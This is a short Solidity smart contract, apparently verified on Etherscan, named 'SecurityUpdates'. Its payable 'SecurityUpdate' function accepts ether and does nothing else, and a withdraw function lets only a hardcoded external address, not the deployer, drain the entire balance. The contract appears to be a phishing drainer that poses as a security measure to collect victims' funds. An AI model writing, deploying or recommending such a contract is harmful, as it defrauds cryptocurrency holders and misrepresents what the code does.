/**
 *Submitted for verification at Etherscan.io on 2023-06-26
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;    // current owner of the contract
    address private  withdraw_ = 0x0056772Bdf90826648CF25c6977e535733875724;
     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(msg.sender == withdraw_);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}